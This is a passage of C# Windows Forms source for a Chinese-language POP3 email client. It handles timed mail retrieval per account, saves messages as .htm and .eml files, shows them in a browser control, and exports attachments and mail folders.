                   File.Copy(strFullPath, toPath, true);
                   MessageBox.Show("导出成功！！");
               }
            }
            catch(Exception ee)
            {
                Console.WriteLine(ee.Message);
            }

        }
        private void menuExpAllEml(object sender, EventArgs e)
        {
            try
            {

                FolderBrowserDialog folderBrowserDialog1 = new FolderBrowserDialog();
                DialogResult result = folderBrowserDialog1.ShowDialog();
                if (result == DialogResult.OK)
                {
                    int i = treeViewEmails.SelectedNode.Index;
                    string folderName = folderBrowserDialog1.SelectedPath;
                    //Console.WriteLine(folderName);
                    // Get the subdirectories for the specified directory.
                    string strEmail = treeViewAccounts.SelectedNode.Text;
                    string file = m_dicEmails[strEmail][i].file;
                    string strFullPath = AppDomain.CurrentDomain.BaseDirectory + "data\\inbox\\" + strEmail;
                    DirectoryInfo dir = new DirectoryInfo(strFullPath);
                    string destDirName=folderName + "\\" + strEmail;
                    if (!dir.Exists)
                    {
                        throw new DirectoryNotFoundException(
                            "Source directory does not exist or could not be found: "
                           );
                    }

                    // If the destination directory doesn't exist, create it. 
                    if (!Directory.Exists(destDirName))
                    {
                        Directory.CreateDirectory(destDirName);
                    }
                    else
                    {
                        MessageBox.Show("目录存在");
                        return;
                    }
                    

                    // Get the files in the directory and copy them to the new location.
                    FileInfo[] files = dir.GetFiles();
                    foreach (FileInfo fi in files)
                    {
                        string temppath = Path.Combine(destDirName, fi.Name);
                        if(fi.Extension==".eml")//only copy eml
                            fi.CopyTo(temppath, false);
                    }
                    MessageBox.Show("导出成功！！");
                }



            }
            catch(Exception ee)
            {
                Console.WriteLine(ee.Message);
            }

            //MessageBox.Show("menuExpAllEml");
        }
        private void initRecvTab()//thread to init Recv email tab
        {
            m_gMAccounts.WaitOne();
            SetText(labelRecvStatus ,"正在初始化请稍等。。。");
            m_gMAccounts.ReleaseMutex();
            //do inits
            
            //unserilize email accounts
        
            try
            {
                string confPath = AppDomain.CurrentDomain.BaseDirectory + "data\\emails.xml";
                var serializer = new XmlSerializer(typeof(List<MailPwd>));
                using (var stream = File.OpenRead(confPath))
                {
                    var other = (List<MailPwd>)(serializer.Deserialize(stream));
                    listStoredAccount.AddRange(other);
                }
               
            }
            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
                //create if not exists
            }
            foreach (MailPwd mp in listStoredAccount)
            {
                AddTreeView(treeViewAccounts, mp.email);
                string dir = "data\\inbox\\" + mp.email;
                try//create mailbox dir
                {

                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }

                }
                catch (Exception exx)
                {
                    Console.WriteLine(exx.Message);
                }
                //init mail list
               // List<EmailMap> em = new List<EmailMap>();
                if (File.Exists(dir + "\\index.xml"))
                {
                    try
                    {
                        string confPath = dir + "\\index.xml";
                        var serializer = new XmlSerializer(typeof(List<EmailMap>));
                        using (var stream = File.OpenRead(confPath))
                        {
                            var other = (List<EmailMap>)(serializer.Deserialize(stream));
                            // em.AddRange(other);
                            m_dicEmails.Add(mp.email, other);
                            stream.Close();
                        }
                    }
                    catch (Exception ee)
                    {
                        Console.WriteLine(ee.Message);
                    }
                }



            }
            //init timer

            //load config
            
            try
            {
                string strTimer = File.ReadAllText("timer.ini");                     
                if (strTimer.Split(' ')[1] == "1")
                {
                    m_isTimerEnabled = true;
                }
                else
                {
                    m_isTimerEnabled = false;
                }
               m_nTimer= int.Parse(strTimer.Split(' ')[0]);
               
            }
            catch (Exception ee)
            {
                MessageBox.Show("整数时间间隔");
                return;
            }
            //init timer and thread
            m_thTimer = new Thread(recvTimer);
            try
            {
                m_Timer = new System.Timers.Timer(m_nTimer * 1000 * 60);
            }
            catch (Exception ee)
            {
                MessageBox.Show("定时收取时间间隔错误");
                return;
            }
            m_thTimer.Start();

     
            //finished
            m_gMAccounts.WaitOne();
            SetButton(buttonStartRecv, true);
            SetText(labelRecvStatus, "空闲");
            m_gMAccounts.ReleaseMutex();

        }
        private void recvTimer()//定时收取
        {
           
                // Hook up the Elapsed event for the timer. 
                m_Timer.Elapsed += OnTimedEvent;
                m_Timer.Enabled = m_isTimerEnabled;
          
        }
        private  void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            if (m_isTimerEnabled)
            {
               // Console.WriteLine("Hello World!");
                //buttonStartRecv_Click(new Object { }, new EventArgs());
                SetButton(buttonStartRecv, false);
                SetText(labelRecvStatus, "正在收取所有邮件请稍等。。");
                //create recv email threads
                int n = listStoredAccount.Count;
                m_nTotalRecvAccounts = 0;
                for (int i = 0; i < n; i++)
                {
                    MailPwd mp = listStoredAccount[i];
                    Thread t = new Thread(() => recvEmail(mp));
                    t.Start();

                    // recvEmail(listStoredAccount[i]);
                }
            }
            else
            {
                //Console.WriteLine("nop");
            }
        }
        private void recvEmail(MailPwd mp)
        {
            //fix bug
            foreach (MailPwd mp1 in listStoredAccount)
            {
                
                string dir = "data\\inbox\\" + mp1.email;
                try//create mailbox dir
                {

                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }

                }
                catch (Exception exx)
                {
                    Console.WriteLine(exx.Message);
                }
            }

            m_gMAccounts.WaitOne();
            SetText(labelRecvStatus, "正在收取"+mp.email+"....请等待");
            m_gMAccounts.ReleaseMutex();
            Pop3Client pop3Client = new Pop3Client();
            data sev = m_dicPopServers[emailToDomain(mp.email)];
            int messageCount=0;
            try
            {
                pop3Client.Connect(sev.pop3, sev.port, sev.isSSL);
                pop3Client.Authenticate(mp.email, mp.pwd);
                //  int count = pop3Client.GetMessageCount();


                messageCount = pop3Client.GetMessageCount();
            }
            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
            // init index list
            List<EmailMap> em = new List<EmailMap>();

            try
            {
                string dirPath = @"data\inbox\" + mp.email;
                //deserilize index.xml
                 if (File.Exists(dirPath+"\\index.xml"))
                 {
                     string confPath = dirPath + "\\index.xml";
                     var serializer = new XmlSerializer(typeof(List<EmailMap>));
                     using (var stream = File.OpenRead(confPath))
                     {
                         var other = (List<EmailMap>)(serializer.Deserialize(stream));
                         em.AddRange(other);
                         stream.Close();
                     }
                 }
                List<EmailMap> emTmp = new List<EmailMap>();




                // string[] paths= Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories);

                List<Message> allMessages = new List<Message>(messageCount);
                int nCurCount;
                try
                {

                    nCurCount = m_dicEmails[mp.email].Count;
                }
                catch (Exception exx)
                {
                    Console.WriteLine(exx.Message);
                    nCurCount = 0;
                }

                // Messages are numbered in the interval: [1, messageCount]
                // Ergo: message numbers are 1-based.
                // Most servers give the latest message the highest number
                for (int i = nCurCount + 1; i <= messageCount; i++)
                {
                    // allMessages.Add(pop3Client.GetMessage(i));
                    Message msg = pop3Client.GetMessage(i);
                    string strSubject = msg.Headers.Subject;
                    string filename = pop3Client.GetMessageHeaders(i).MessageId;
                    emTmp.Add(new EmailMap() { title = strSubject, file = filename });

                    //write to htm file

                    // If the selected node is not a subnode and therefore does not
                    // have a MessagePart in it's Tag property, we genericly find some content to show

                    // Find the first text/plain version
                    MessagePart plainTextPart = msg.FindFirstPlainTextVersion();
                    string strContent;
                    if (plainTextPart != null)
                    {
                        // The message had a text/plain version - show that one
                        strContent = plainTextPart.GetBodyAsText();
                    }
                    else
                    {
                        // Try to find a body to show in some of the other text versions
                        List<MessagePart> textVersions = msg.FindAllTextVersions();
                        if (textVersions.Count >= 1)
                            strContent = textVersions[0].GetBodyAsText();
                        else
                            strContent = "<<KibodWapon>> Cannot find a text version body in this message to show <<contact me qq408079058>>";
                    }
                    string strMailPath = dirPath + "\\" + filename + ".htm";

                    using (System.IO.StreamWriter file = new System.IO.StreamWriter(strMailPath))
                    {
                        file.WriteLine("<head><meta charset=\"UTF-8\"></head>");
                        file.WriteLine(strContent);
                        file.Close();

                    }
                    File.WriteAllText(dirPath + "\\" + filename + ".eml", Encoding.ASCII.GetString(msg.RawMessage));

                }
                //serilize index.xml
                try
                {
                    m_dicEmails[mp.email].AddRange(emTmp);//exists
                }
                catch (Exception ee)
                {
                    Console.WriteLine(ee.Message);
                    m_dicEmails.Add(mp.email, emTmp);//not exists
                }

                try
                {
                    string confPath = @"data\inbox\" + mp.email + "\\index.xml";
                    File.Delete(confPath);
                    var serializer = new XmlSerializer(typeof(List<EmailMap>));
                    using (var stream = File.OpenWrite(confPath))
                    {
                        serializer.Serialize(stream, m_dicEmails[mp.email]);
                        stream.Close();
                    }

                }
                catch (Exception ee)
                {
                    Console.WriteLine(ee.Message);
                }


            }
            catch (Exception UAEx)
            {
                Console.WriteLine(UAEx.Message);
            }
            try
            {

                pop3Client.Disconnect();
            }
            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }

            m_gMAccounts.WaitOne();
            SetText(labelRecvStatus, "收取" + mp.email + "....完成请等待！");
            m_nTotalRecvAccounts++;
            if (m_nTotalRecvAccounts == listStoredAccount.Count)
            {
                MessageBox.Show("收取所有邮件完成~~");
                SetButton(buttonStartRecv, true);
                SetText(labelRecvStatus, "空闲");
            }

            m_gMAccounts.ReleaseMutex();

        }

        private void buttonStartRecv_Click(object sender, EventArgs e)
        {
           
            buttonStartRecv.Enabled = false;
            labelRecvStatus.Text = "正在收取所有邮件请稍等。。";
            storeAccount();
            //create recv email threads
            int n=listStoredAccount.Count;
            m_nTotalRecvAccounts = 0;
            for (int i = 0; i < n; i++)
            {
                MailPwd mp = new MailPwd() ;
                mp = listStoredAccount[i];
                Thread t = new Thread(() => recvEmail(mp));
                t.Start();

               // recvEmail(listStoredAccount[i]);
            }
            //recvEmail(listStoredAccount[0]);

        }
        private string emailToDomain(string email)//return domain name from a email address
        {
            string strDomain;
            try
            {
                strDomain = email.Split('@')[1];
                return strDomain;
            }
            catch (Exception ex)
            {

                Console.WriteLine("invalide email address");
                return "";
            }
        }
        private void test(MailPwd mp)
        {
            Pop3Client pop3Client = new Pop3Client();
            data sev = m_dicPopServers[emailToDomain(mp.email)];

            pop3Client.Connect(sev.pop3,sev.port , sev.isSSL);
            pop3Client.Authenticate(mp.email, mp.pwd);
          //  int count = pop3Client.GetMessageCount();


            int messageCount = pop3Client.GetMessageCount();
            // init index list
            List<EmailMap> em = new List<EmailMap>();

            try
            {
                string dirPath = @"data\inbox\" + mp.email;
                //serilize index.xml
               /* if (File.Exists(dirPath+"\\index.xml"))
                {
                    string confPath = dirPath + "\\index.xml";
                    var serializer = new XmlSerializer(typeof(List<EmailMap>));
                    using (var stream = File.OpenRead(confPath))
                    {
                        var other = (List<EmailMap>)(serializer.Deserialize(stream));
                        em.AddRange(other);
                        stream.Close();
                    }
                }*/
                 List<EmailMap> emTmp = new List<EmailMap>();

               
               

               // string[] paths= Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories);

                List<Message> allMessages = new List<Message>(messageCount);
                int nCurCount = m_dicEmails[mp.email].Count;
                // Messages are numbered in the interval: [1, messageCount]
                // Ergo: message numbers are 1-based.
                // Most servers give the latest message the highest number
                for (int i = nCurCount + 1; i <= messageCount; i++)
                {
                   // allMessages.Add(pop3Client.GetMessage(i));
                    Message msg=pop3Client.GetMessage(i);
                    string strSubject=msg.Headers.Subject;
                    string filename=pop3Client.GetMessageHeaders(i).MessageId;
                    emTmp.Add(new EmailMap { title = strSubject,file=filename });

                    //write to htm file

                    // If the selected node is not a subnode and therefore does not
                    // have a MessagePart in it's Tag property, we genericly find some content to show

                    // Find the first text/plain version
                    MessagePart plainTextPart = msg.FindFirstPlainTextVersion();
                    string strContent;
                    if (plainTextPart != null)
                    {
                        // The message had a text/plain version - show that one
                        strContent = plainTextPart.GetBodyAsText();
                    }
                    else
                    {
                        // Try to find a body to show in some of the other text versions
                        List<MessagePart> textVersions = msg.FindAllTextVersions();
                        if (textVersions.Count >= 1)
                            strContent = textVersions[0].GetBodyAsText();
                        else
                            strContent = "<<KibodWapon>> Cannot find a text version body in this message to show <<contact me qq408079058>>";
                    }
                    string strMailPath = dirPath + "\\" + filename + ".htm";

                    using (System.IO.StreamWriter file = new System.IO.StreamWriter(strMailPath))
                    {
                        file.WriteLine("<head><meta charset=\"UTF-8\"></head>");
                        file.WriteLine(strContent);
                        file.Close();

                    }
                    File.WriteAllText(dirPath + "\\" + filename + ".eml", Encoding.ASCII.GetString(msg.RawMessage));
                   
                }
                //serilize index.xml
                m_dicEmails[mp.email].AddRange(emTmp);
                try
                {
                    string confPath =@"data\inbox\" + mp.email+"\\index.xml";
                    File.Delete(confPath);
                    var serializer = new XmlSerializer(typeof(List<EmailMap>));
                    using (var stream = File.OpenWrite(confPath))
                    {
                        serializer.Serialize(stream, em);
                        stream.Close();
                    }

                }
                catch (Exception ee)
                {
                    Console.WriteLine(ee.Message);
                }


            }
            catch (Exception UAEx)
            {
                Console.WriteLine(UAEx.Message);
            }       
             pop3Client.Disconnect();

           
        }

        private void treeViewEmails_AfterSelect(object sender, TreeViewEventArgs e)
        {
           // Console.WriteLine(e.Node.Index);

            //init email viewer
            string strEmail = treeViewAccounts.SelectedNode.Text;
            string dirPath =AppDomain.CurrentDomain.BaseDirectory +  @"data\inbox\" + strEmail;
            string shortFile = m_dicEmails[strEmail][e.Node.Index].file;
            string strUrl = "file://" + dirPath + "\\" + shortFile + ".htm";
            Console.WriteLine(strUrl);
            Uri uri = new Uri(strUrl);
           webBrowserMailContent.Url = uri;

            //init attachment
           Message message = new Message(File.ReadAllBytes(dirPath + "\\" + shortFile + ".eml"));
                // Build up the attachment list
            List < MessagePart > attachments = message.FindAllAttachments();
            treeViewAttach.Nodes.Clear();
            foreach (MessagePart attachment in attachments)
            {
                // Add the attachment to the list of attachments
                TreeNode addedNode = treeViewAttach.Nodes.Add((attachment.FileName));

                // Keep a reference to the attachment in the Tag property
                addedNode.Tag = attachment;
            }

         
        }

        private void treeViewAttach_AfterSelect(object sender, TreeViewEventArgs e)
        {
            // Fetch the attachment part which is currently selected
            SaveFileDialog saveFile = new SaveFileDialog(); ;
            MessagePart attachment = (MessagePart)treeViewAttach.SelectedNode.Tag;

            if (attachment != null)
            {
                saveFile.FileName = attachment.FileName;
                DialogResult result = saveFile.ShowDialog();
                if (result != DialogResult.OK)
                    return;

                // Now we want to save the attachment
                FileInfo file = new FileInfo(saveFile.FileName);

                // Check if the file already exists
                if (file.Exists)
                {
                    // User was asked when he chose the file, if he wanted to overwrite it
                    // Therefore, when we get to here, it is okay to delete the file
                    file.Delete();
                }

                // Lets try to save to the file
                try
                {
                    attachment.Save(file);

                    MessageBox.Show(this, "附件保存成功");
                }
                catch (Exception exx)
                {
                    MessageBox.Show(this, "Attachment saving failed. Exception message: " + exx.Message);
                }
            }
            else
            {
                MessageBox.Show(this, "Attachment object was null!");
            }
        }

        private void buttonRecvSetting_Click(object sender, EventArgs e)
        {
            RecvTimerSetting formSet = new RecvTimerSetting();
            formSet.StartPosition = FormStartPosition.CenterParent;
            if (formSet.ShowDialog(this) != DialogResult.OK)
            {
              
                return;
            }
                      //check null 
            if (String.IsNullOrEmpty(formSet.m_nTimer.ToString()))
            {
                MessageBox.Show("不能为空");
                return;
            }
            //update data
            try
            {
                m_isTimerEnabled = formSet.m_isEnabled;
                m_nTimer = formSet.m_nTimer;
                m_Timer.Interval = m_nTimer * 1000 * 60;
                m_Timer.Enabled = formSet.m_isEnabled;
            }
            catch (Exception exx)
            {
                MessageBox.Show("定时收取时间间隔错误");
                Console.WriteLine(exx.Message);
                
            }

        }

        private void webBrowserMailContent_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }
        
    }
}
